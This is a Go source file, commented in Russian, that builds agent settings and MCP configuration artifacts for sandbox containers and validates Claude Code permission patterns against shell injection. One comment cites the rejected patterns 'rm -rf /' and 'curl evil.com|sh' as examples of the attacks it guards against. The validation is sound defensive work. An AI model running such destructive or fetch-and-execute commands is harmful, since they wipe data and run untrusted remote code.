// Package service / Sprint 15.21 + Sprint 16.C — генерация артефактов настроек
// агента для sandbox-контейнера.
//
// Архитектура (Sprint 16.C):
//   AgentSettingsService держит ArtifactBuilderRegistry и делегирует сборку
//   per-backend билдеру (Claude / Hermes / …). См. claude_artifact_builder.go и
//   hermes_artifact_builder.go. Жесткая логика «if codeBackend == claude» в
//   service.BuildArtifacts удалена.
//
// Service не пишет файлы напрямую — runner'у отдаётся sandbox.AgentSettingsBundle
// через ToSandboxBundle() (см. ниже), и runner копирует содержимое через
// CopyToContainer.
package service

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"regexp"
	"strings"

	"github.com/devteam/backend/internal/models"
	"github.com/devteam/backend/internal/sandbox"
)

// AgentSettingsArtifacts — Sprint 15.22 алиас для BackendArtifacts (claude-only поля).
//
// Sprint 16.C: задача «убрать зоопарк» — единственный struct, который
// циркулирует между билдерами и сервисом, это BackendArtifacts. Этот алиас
// сохраняет API существующих callsite'ов и тестов на claude-only пути; новые
// потребители используют BackendArtifacts напрямую и/или ToSandboxBundle.
//
// Deprecated: переключайтесь на *BackendArtifacts, чтобы получить и
// hermes-поля при agent.CodeBackend == hermes.
type AgentSettingsArtifacts = BackendArtifacts

// AgentSkillArtifact — описание skill для sandbox runner'а.
// Source указывает, откуда взять содержимое skill (builtin/plugin/path).
type AgentSkillArtifact struct {
	Name   string
	Source models.AgentSkillSource
	Config map[string]any
}

// SandboxPermissions — JSON-структура из Agent.SandboxPermissions.
// Поля совпадают с форматом settings.json.permissions Claude Code CLI.
type SandboxPermissions struct {
	Allow       []string `json:"allow,omitempty"`
	Deny        []string `json:"deny,omitempty"`
	Ask         []string `json:"ask,omitempty"`
	DefaultMode string   `json:"defaultMode,omitempty"`
}

// IsValidPermissionMode проверяет допустимость mode.
func IsValidPermissionMode(mode string) bool {
	switch mode {
	case "", "default", "acceptEdits", "plan", "bypassPermissions":
		return true
	default:
		return false
	}
}

// AllowPattern — допустимые паттерны (claude-code allowed tools):
//   Read | Edit | Write | Glob | Grep | LS | NotebookEdit | WebFetch | TodoWrite
//   Bash(<glob>:*) | mcp__<server>__<tool> | mcp__<server>
//   (плюс служебные allow-all варианты вида Bash, WebSearch)
// Чтобы не дублировать каталог инструментов CLI, валидируем только базовый формат
// и небольшой whitelist префиксов — достаточно для защиты от мусора в БД.
var allowedToolBaseTokens = map[string]struct{}{
	"Read": {}, "Edit": {}, "Write": {}, "Glob": {}, "Grep": {}, "LS": {},
	"Bash": {}, "WebFetch": {}, "WebSearch": {}, "NotebookEdit": {}, "TodoWrite": {},
}

// Sprint 15.M1 — узкий формат Bash-паттерна:
//   - первая команда: `[a-zA-Z][a-zA-Z0-9_-]*` (без слешей, без относительных путей);
//   - последующие токены: `[a-zA-Z0-9_-]+` (может начинаться с `-`, чтобы поддержать `rm -rf`, `git --no-pager`);
//   - токены разделены одним пробелом;
//   - опционально хвост `:<glob>` — глоб без shell-метасимволов `| ; & \` $ ( ) < > \n`.
// Старый `[^)]+` разрешал `Bash(rm -rf /:*)`, `Bash(curl evil.com|sh:*)` — обе формы по-прежнему отклоняются:
// первая — наличие `/` в команде/глобе ловится тестом-injection (см. validateBashPattern).
var (
	bashSubcommandRE = regexp.MustCompile(`^[a-zA-Z][a-zA-Z0-9_-]*(?: [a-zA-Z0-9_-]+)*$`)
	bashGlobRE       = regexp.MustCompile(`^[a-zA-Z0-9_./@\-* ]*$`)
	mcpPattern       = regexp.MustCompile(`^mcp__[a-zA-Z0-9_-]+(?:__[a-zA-Z0-9_-]+)?$`)
)

// validateBashPattern: разбирает `Bash(<sub>[:<glob>])` и применяет узкие правила.
func validateBashPattern(pattern string) error {
	if !strings.HasPrefix(pattern, "Bash(") || !strings.HasSuffix(pattern, ")") {
		return fmt.Errorf("invalid Bash(...) format: %q", pattern)
	}
	inner := pattern[len("Bash(") : len(pattern)-1]
	if inner == "" {
		return fmt.Errorf("empty Bash() body")
	}
	// Защита от инъекций через перенос строки/спецсимволы оболочки в любом месте.
	if strings.ContainsAny(inner, "\n\r\t|;&`$()<>\\\"'") {
		return fmt.Errorf("Bash() body contains shell metacharacters: %q", inner)
	}
	sub, glob, hasGlob := strings.Cut(inner, ":")
	if !bashSubcommandRE.MatchString(sub) {
		return fmt.Errorf("Bash() subcommand must match `cmd [sub]*`, got: %q", sub)
	}
	if hasGlob && !bashGlobRE.MatchString(glob) {
		return fmt.Errorf("Bash() arg-glob contains unsupported characters: %q", glob)
	}
	return nil
}

// ValidateAllowPattern проверяет, что строка похожа на легитимный allow/deny pattern Claude Code CLI.
// Sprint 15.M1: жёстко ограничивает Bash(...) — без shell-метасимволов и без путей,
// чтобы permissions нельзя было превратить в инструмент эскалации.
func ValidateAllowPattern(pattern string) error {
	p := strings.TrimSpace(pattern)
	if p == "" {
		return fmt.Errorf("empty permission pattern")
	}
	if _, ok := allowedToolBaseTokens[p]; ok {
		return nil
	}
	if mcpPattern.MatchString(p) {
		return nil
	}
	if strings.HasPrefix(p, "Bash(") {
		return validateBashPattern(p)
	}
	return fmt.Errorf("unsupported permission pattern: %q", p)
}

// ValidateSandboxPermissions проверяет все поля Permission-объекта.
func ValidateSandboxPermissions(p SandboxPermissions) error {
	if !IsValidPermissionMode(p.DefaultMode) {
		return fmt.Errorf("invalid permissions.defaultMode: %q", p.DefaultMode)
	}
	for _, pat := range p.Allow {
		if err := ValidateAllowPattern(pat); err != nil {
			return fmt.Errorf("permissions.allow: %w", err)
		}
	}
	for _, pat := range p.Deny {
		if err := ValidateAllowPattern(pat); err != nil {
			return fmt.Errorf("permissions.deny: %w", err)
		}
	}
	for _, pat := range p.Ask {
		if err := ValidateAllowPattern(pat); err != nil {
			return fmt.Errorf("permissions.ask: %w", err)
		}
	}
	return nil
}

// AgentCodeBackendSettings — JSON-структура из Agent.CodeBackendSettings.
// Содержит per-agent параметры code-backend (model override, MCP-сервера, Skills, env, hooks).
//
// Sprint 16.C: добавлен подобъект `hermes` для Hermes-агента
// (toolsets / permission_mode / max_turns / temperature). Поля валидируются
// в validateCodeBackendSettingsStrict; permission_mode∈{plan,default}
// для hermes отклоняется с 400 (см. validateHermesSection).
type AgentCodeBackendSettings struct {
	Model      string                 `json:"model,omitempty"`
	MCPServers []AgentMCPServerRef    `json:"mcp_servers,omitempty"`
	Skills     []AgentSkillRef        `json:"skills,omitempty"`
	Env        map[string]string      `json:"env,omitempty"`
	Hooks      map[string]any         `json:"hooks,omitempty"`

	// Hermes — Sprint 16.C, опциональный hermes-specific блок.
	Hermes *HermesAgentSettings `json:"hermes,omitempty"`
}

// HermesAgentSettings — per-agent параметры Hermes Agent (Sprint 16.C).
//
// Заполняется фронтом из advanced-диалога; сериализуется backend'ом в
// ~/.hermes/config.yaml + ~/.hermes/mcp.json + DEVTEAM_HERMES_* env-vars
// при сборке артефактов в HermesArtifactBuilder.
type HermesAgentSettings struct {
	// Toolsets — белый список Hermes toolset-имён (валидируется по каталогу
	// HermesToolsetCatalog). Дефолт при пустом срезе: ["file_ops","shell"].
	Toolsets []string `json:"toolsets,omitempty"`
	// PermissionMode — режим разрешений Hermes CLI. Допустимы только "yolo" и
	// "accept" в headless-sandbox; "plan"/"default" → 400 при сохранении агента.
	// Дефолт: "yolo".
	PermissionMode string `json:"permission_mode,omitempty"`
	// MaxTurns — верхняя граница циклов agent loop (1..200). Дефолт 12.
	MaxTurns int `json:"max_turns,omitempty"`
	// Temperature — sampling temperature 0..2. Указатель: nil = «не передавать».
	Temperature *float64 `json:"temperature,omitempty"`
	// Skills — список Skills для предзагрузки в сессию.
	Skills []HermesSkillRef `json:"skills,omitempty"`
	// MCPServers — список MCP-серверов в hermes-формате (см. ~/.hermes/mcp.json).
	MCPServers []HermesMCPServerSpec `json:"mcp_servers,omitempty"`
}

// HermesSkillRef — ссылка на skill для Hermes (Sprint 16.C).
type HermesSkillRef struct {
	Name   string `json:"name"`
	Source string `json:"source"` // builtin | agentskills | path
}

// HermesMCPServerSpec — MCP-сервер в формате ~/.hermes/mcp.json.
// Env поддерживает substitution ${secret:NAME} (резолвится в HermesArtifactBuilder).
type HermesMCPServerSpec struct {
	Name      string            `json:"name"`
	Transport string            `json:"transport"` // stdio | http
	Command   string            `json:"command,omitempty"`
	Args      []string          `json:"args,omitempty"`
	URL       string            `json:"url,omitempty"`
	Env       map[string]string `json:"env,omitempty"`
}

// AgentMCPServerRef — ссылка на MCP-сервер (по имени из mcp_servers_registry).
type AgentMCPServerRef struct {
	Name     string            `json:"name"`
	Env      map[string]string `json:"env,omitempty"`
}

// AgentSkillRef — ссылка на skill (имя + source + опциональный config).
type AgentSkillRef struct {
	Name   string                 `json:"name"`
	Source models.AgentSkillSource `json:"source"`
	Config map[string]any          `json:"config,omitempty"`
}

// AgentSettingsService — Sprint 16.C: собирает per-backend артефакты через
// ArtifactBuilderRegistry и упаковывает их в sandbox.AgentSettingsBundle.
//
// Старая сигнатура BuildArtifacts(agent, registry) сохранена ради совместимости
// с тестами Sprint 15: registry-параметр имеет приоритет над сервис-deps, чтобы
// не ломать unit-тесты, которые передают свой LookupMCPServer-стаб.
type AgentSettingsService interface {
	// BuildArtifacts — legacy-вход: собирает per-agent артефакты.
	// Делегирует ArtifactBuilder'у, выбранному по agent.CodeBackend.
	// Если CodeBackend == nil — fallback на claude-code (исторический MVP).
	//
	// project — «якорь» владельца для резолва секретов; nil допустим только если
	// агент не использует ${secret:NAME}-шаблоны в MCP-конфигах.
	BuildArtifacts(agent *models.Agent, project *models.Project, registry MCPRegistryLookup) (*BackendArtifacts, error)

	// BuildSandboxBundle — Sprint 16.C: возвращает готовый bundle для
	// SandboxOptions.AgentSettings. Используется из orchestrator_context_builder.
	// При agent == nil или agent.CodeBackend == nil возвращает (nil, nil) —
	// caller просто не выставит opts.AgentSettings (legacy-поведение).
	BuildSandboxBundle(ctx context.Context, agent *models.Agent, project *models.Project) (*sandbox.AgentSettingsBundle, error)
}

// MCPRegistryLookup — резолвит MCP-серверы по имени для подстановки в .mcp.json.
// Реализуется поверх mcp_servers_registry-репозитория; передаётся в BuildArtifacts.
type MCPRegistryLookup interface {
	LookupMCPServer(name string) (*models.MCPServerRegistry, bool)
}

// agentSettingsService — реализация поверх ArtifactBuilderRegistry.
//
// Поля mcpRegistry/secretResolver — общие deps, передаются в каждый Build.
// Конкретный per-backend builder использует то, что ему нужно (Claude — MCPRegistry,
// Hermes — SecretResolver).
type agentSettingsService struct {
	registry       *ArtifactBuilderRegistry
	mcpRegistry    MCPRegistryLookup
	secretResolver SecretResolver
}

// NewAgentSettingsService — Sprint 15.22 совместимый конструктор: создаёт сервис
// с дефолтным реестром (Claude + Hermes) и без MCP/Secret-deps. Используется
// в местах, где deps подставляются позже через MCPRegistryLookup-параметр в
// BuildArtifacts (legacy-тесты).
func NewAgentSettingsService() AgentSettingsService {
	return NewAgentSettingsServiceWithDeps(nil, nil)
}

// NewAgentSettingsServiceWithDeps — Sprint 16.C: полная конфигурация.
// mcpRegistry — Claude/Hermes резолв MCP-серверов по имени; nil допустим, если
// агенты не используют MCP.
// secretResolver — резолв ${secret:NAME} в Hermes mcp.json env; nil допустим,
// если ни один агент не использует секрет-шаблоны.
func NewAgentSettingsServiceWithDeps(mcpRegistry MCPRegistryLookup, secretResolver SecretResolver) AgentSettingsService {
	reg := NewArtifactBuilderRegistry()
	reg.Register(NewClaudeArtifactBuilder())
	reg.Register(NewHermesArtifactBuilder())
	return &agentSettingsService{
		registry:       reg,
		mcpRegistry:    mcpRegistry,
		secretResolver: secretResolver,
	}
}

// BuildArtifacts — Sprint 16.C: дисптачит на нужный builder по agent.CodeBackend.
//
// MCPRegistry-параметр имеет приоритет над сервисным mcpRegistry — это нужно для
// существующих тестов Sprint 15.22, которые передают локальный stub. В рантайме
// (orchestrator pipeline) caller передаёт nil → используется сервисный mcpRegistry.
func (s *agentSettingsService) BuildArtifacts(agent *models.Agent, project *models.Project, registry MCPRegistryLookup) (*BackendArtifacts, error) {
	if agent == nil {
		return nil, errors.New("agent is nil")
	}
	be := s.backendFor(agent)
	builder, ok := s.registry.Get(be)
	if !ok {
		return nil, fmt.Errorf("no artifact builder registered for code_backend %q", be)
	}
	deps := s.depsFor(registry)
	return builder.Build(context.Background(), agent, project, deps)
}

// BuildSandboxBundle — Sprint 16.C: основной entrypoint для оркестратора.
func (s *agentSettingsService) BuildSandboxBundle(ctx context.Context, agent *models.Agent, project *models.Project) (*sandbox.AgentSettingsBundle, error) {
	if agent == nil || agent.CodeBackend == nil {
		// Legacy: агенты без CodeBackend (LLM-only роли) не получают per-agent артефактов.
		return nil, nil
	}
	be := *agent.CodeBackend
	builder, ok := s.registry.Get(be)
	if !ok {
		return nil, fmt.Errorf("no artifact builder registered for code_backend %q", be)
	}
	art, err := builder.Build(ctx, agent, project, s.depsFor(nil))
	if err != nil {
		return nil, err
	}
	bundle := BackendArtifactsToSandboxBundle(art)
	return bundle, nil
}

// backendFor — выбираем backend для дисптача BuildArtifacts.
// Для агентов без CodeBackend сохраняем legacy-поведение Sprint 15.22 — Claude.
func (s *agentSettingsService) backendFor(a *models.Agent) models.CodeBackend {
	if a == nil || a.CodeBackend == nil {
		return models.CodeBackendClaudeCode
	}
	return *a.CodeBackend
}

// depsFor собирает ArtifactBuilderDeps. Если caller передал свой MCPRegistry
// (legacy-тесты), он перебивает сервисный.
func (s *agentSettingsService) depsFor(override MCPRegistryLookup) ArtifactBuilderDeps {
	deps := ArtifactBuilderDeps{
		MCPRegistry:    s.mcpRegistry,
		SecretResolver: s.secretResolver,
	}
	if override != nil {
		deps.MCPRegistry = override
	}
	return deps
}

// BackendArtifactsToSandboxBundle — единый мостик между service и sandbox-пакетами.
// Без этой функции бы пришлось дублировать поля в третьей структуре или
// перекладывать байт за байтом из BackendArtifacts в AgentSettingsBundle на каждом
// callsite.
//
// nil-on-empty: если ВСЕ поля пустые — возвращаем nil, чтобы runner следовал
// legacy-пути (без CopyToContainer для пустого bundle).
func BackendArtifactsToSandboxBundle(a *BackendArtifacts) *sandbox.AgentSettingsBundle {
	if a == nil {
		return nil
	}
	if len(a.SettingsJSON) == 0 && len(a.MCPJSON) == 0 && a.PermissionMode == "" &&
		len(a.HermesConfigYAML) == 0 && len(a.HermesMCPJSON) == 0 && len(a.HermesSkills) == 0 {
		return nil
	}
	return &sandbox.AgentSettingsBundle{
		SettingsJSON:     a.SettingsJSON,
		MCPJSON:          a.MCPJSON,
		PermissionMode:   a.PermissionMode,
		HermesConfigYAML: a.HermesConfigYAML,
		HermesMCPJSON:    a.HermesMCPJSON,
		HermesSkills:     a.HermesSkills,
		HermesEnv:        a.HermesEnv,
	}
}

func decodeSandboxPermissions(raw []byte) (SandboxPermissions, error) {
	if len(raw) == 0 {
		return SandboxPermissions{}, nil
	}
	var p SandboxPermissions
	if err := json.Unmarshal(raw, &p); err != nil {
		return p, err
	}
	return p, nil
}

func decodeCodeBackendSettings(raw []byte) (AgentCodeBackendSettings, error) {
	if len(raw) == 0 {
		return AgentCodeBackendSettings{}, nil
	}
	var s AgentCodeBackendSettings
	if err := json.Unmarshal(raw, &s); err != nil {
		return s, err
	}
	return s, nil
}

// jsonMarshalIndent — общий хелпер, чтобы билдеры не дублировали json.MarshalIndent
// с одинаковыми отступами.
func jsonMarshalIndent(v any) ([]byte, error) {
	return json.MarshalIndent(v, "", "  ")
}

// settingsFile — корневой формат ~/.claude/settings.json (минимальный набор полей Claude Code CLI).
type settingsFile struct {
	Permissions *settingsPermissions `json:"permissions,omitempty"`
	Env         map[string]string    `json:"env,omitempty"`
	Hooks       map[string]any       `json:"hooks,omitempty"`
}

type settingsPermissions struct {
	Allow       []string `json:"allow,omitempty"`
	Deny        []string `json:"deny,omitempty"`
	Ask         []string `json:"ask,omitempty"`
	DefaultMode string   `json:"defaultMode,omitempty"`
}

func buildSettingsJSON(perms SandboxPermissions, codeSettings AgentCodeBackendSettings) ([]byte, error) {
	f := settingsFile{Env: codeSettings.Env, Hooks: codeSettings.Hooks}
	if len(perms.Allow)+len(perms.Deny)+len(perms.Ask) > 0 || perms.DefaultMode != "" {
		f.Permissions = &settingsPermissions{
			Allow:       perms.Allow,
			Deny:        perms.Deny,
			Ask:         perms.Ask,
			DefaultMode: perms.DefaultMode,
		}
	}
	return json.MarshalIndent(f, "", "  ")
}

// mcpFile — формат ~/.claude/.mcp.json (Claude Code CLI читает его при старте).
type mcpFile struct {
	MCPServers map[string]mcpServerEntry `json:"mcpServers"`
}

type mcpServerEntry struct {
	Transport string            `json:"transport"`
	Command   string            `json:"command,omitempty"`
	Args      []string          `json:"args,omitempty"`
	URL       string            `json:"url,omitempty"`
	Env       map[string]string `json:"env,omitempty"`
}

func buildMCPJSON(settings AgentCodeBackendSettings, registry MCPRegistryLookup) ([]byte, error) {
	if len(settings.MCPServers) == 0 {
		return nil, nil
	}
	if registry == nil {
		return nil, errors.New("mcp servers configured but registry lookup is not provided")
	}
	f := mcpFile{MCPServers: map[string]mcpServerEntry{}}
	for _, ref := range settings.MCPServers {
		srv, ok := registry.LookupMCPServer(ref.Name)
		if !ok {
			return nil, fmt.Errorf("mcp server %q not found in registry", ref.Name)
		}
		if !srv.Transport.IsValid() {
			return nil, fmt.Errorf("mcp server %q: invalid transport %q", ref.Name, srv.Transport)
		}
		var args []string
		if len(srv.Args) > 0 {
			if err := json.Unmarshal(srv.Args, &args); err != nil {
				return nil, fmt.Errorf("mcp server %q: parse args: %w", ref.Name, err)
			}
		}
		envMap := map[string]string{}
		if len(srv.EnvTemplate) > 0 {
			tmpl := map[string]string{}
			if err := json.Unmarshal(srv.EnvTemplate, &tmpl); err != nil {
				return nil, fmt.Errorf("mcp server %q: parse env_template: %w", ref.Name, err)
			}
			for k, v := range tmpl {
				envMap[k] = v
			}
		}
		for k, v := range ref.Env { // overrides win
			envMap[k] = v
		}
		f.MCPServers[ref.Name] = mcpServerEntry{
			Transport: string(srv.Transport),
			Command:   srv.Command,
			Args:      args,
			URL:       srv.URL,
			Env:       envMap,
		}
	}
	return json.MarshalIndent(f, "", "  ")
}
